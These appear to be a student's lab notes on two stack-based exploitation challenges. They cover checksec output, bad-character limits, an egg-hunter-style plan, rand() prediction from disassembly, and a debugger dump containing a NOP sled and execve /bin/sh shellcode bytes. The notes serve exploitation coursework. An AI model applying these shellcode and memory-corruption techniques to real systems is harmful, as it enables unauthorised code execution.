Find-me:

 checksec find-me
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/k-730/.cache/.pwntools-cache-3.13/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] You have the latest version of Pwntools (4.14.1)
[*] '/home/k-730/COMP6447/wk3/find-me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

00401352  4883ec40           sub     rsp, 0x40
=> So stack frame is most likely 0x40 = 64 bytes
Stack frame always changing!

Our stack is at:
contents is printed at $rbp-0x30

Bad chars are 0xf,0x5! We cant use syscall!

This means we have to use the opened fd
file discriptor to read the contents of the flag!! From file descriptor

Should the small shellcode look for the bigger shellcode? YES!

Interesting, another file descriptor for the flag is opened @0x0040158c! Perhaps we must use this!

flag size is 190 bytes

Big buffer is: location is at:
b *main+1006

# 0x7fb5dc353fda

This is higher in memory! Than the smallbuff

small buff has to be less than or equal to 28 bytes. Otherwise big shellcode is lost

SHellz:

└─$ checksec shellz
[*] '/home/k-730/COMP6447/wk3/shellz'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

printf("Here is a random stack address: …", (int64_t)(rand() % 500) + &buf, &buf);
So stack is located at:
stack = leaked_stack + random
somewhere!

Now rsp is 0x2000 = 8192 bytes in size

possible attack paths
OMFG i just have to loop thru 500 of the bytes to find the buffer address
Use the c rand function in python to try and get the flag.

Best way is to predict the rand:

Predict rand() (best)

These instructions fuzz the random:
0040125e  4863d0             movsxd  rdx, eax                   0x3e92da52
00401261  4869d2d34d6210     imul    rdx, rdx, 0x10624dd3       0x3e92da52 *0x10624dd3 = 0x40134e2_72189b96
00401268  48c1ea20           shr     rdx, 0x20                  0x40134e2 =  0x40134e2_00000000
0040126c  c1fa05             sar     edx, 0x5                   0x2009a7
0040126f  89c1               mov     ecx, eax                   ecx = 0x3e92da52
00401271  c1f91f             sar     ecx, 0x1f(31)              ecx = 0x0 (Could be 1 or 0)!
00401274  29ca               sub     edx, ecx                   edx - ecx (1 or 0)
00401276  69caf4010000       imul    ecx, edx, 0x1f4            ecx = edx* (500)
0040127c  29c8               sub     eax, ecx
0040127e  89c2               mov     edx, eax
00401280  4863c2             movsxd  rax, edx
00401283  488d9500e0ffff     lea     rdx, [rbp-0x2000 {buf}]
0040128a  4801d0             add     rax, rdx {buf}

Example:
0x3e92da52
0x3e92da52 * 0x10624dd3 = 0x40134e272189b96
0x40134e2

x/80gx $rsp
0x7ffd5fdaec60: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaec70: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaec80: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaec90: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaeca0: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaecb0: 0x9090909090909090      0x9090909090909090
0x7ffd5fdaecc0: 0x2fbf4856f6314890      0x5768732f2f6e6962
0x7ffd5fdaecd0: 0x050f99583b6a5f54      0x00007ffd5fdace2c

pwndbg> x/4gx $rbp
0x7ffd5fdaecd0: 0x050f99583b6a5f54      0x00007ffd5fdace2c

WTF why does the order of the payload matter?
